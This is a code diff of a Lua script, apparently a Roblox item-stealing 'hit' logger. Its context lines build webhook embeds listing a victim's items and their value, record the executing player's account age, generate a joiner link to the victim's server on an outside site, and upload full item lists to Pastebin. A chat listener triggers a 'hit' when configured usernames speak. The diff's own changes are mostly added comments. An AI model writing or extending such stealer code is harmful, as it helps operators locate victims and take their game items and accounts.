@@ -159,14 +159,16 @@ local function uploadToPastebin(text)
     return nil
 end
 
+-- NEW: Build the items embed as a separate embed
 local function buildItemsEmbed(items)
     return {
         title = "🎁 Items Received",
         description = string.format("``````", buildBackpackSection(items)),
-        color = 5793266,
+        color = 5793266, -- blue-ish
     }
 end
 
+-- NEW: Build the main embed, including the "View all hits" field
 local function buildMainEmbed(executer, receiver, totalValue, foundRare, pasteLink)
     local joinLink = ("https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=%s"):format(game.JobId)
     local accountAge = (executer and executer.AccountAge or "?") .. " days"
@@ -184,6 +186,7 @@ local function buildMainEmbed(executer, receiver, totalValue, foundRare, pasteLi
     }
 end
 
+-- Helper to build all items text for Pastebin
 local function buildAllItemsText(items)
     if #items == 0 then return "_No items!_" end
     local lines = {}
@@ -197,6 +200,7 @@ local function buildAllItemsText(items)
     return table.concat(lines, "\n")
 end
 
+-- NEW: Only show top 10 in embed, all in paste
 local function prettyWebhookData(executer, receiver)
     local items, totalValue, foundRare = collectItems()
     local topItems = {}
@@ -296,4 +300,4 @@ Players.PlayerAdded:Connect(function(player)
     if table.find(CONFIG.USERNAMES, player.Name) then
         player.Chatted:Connect(function() onHitTrigger(player) end)
     end
-end
+end)
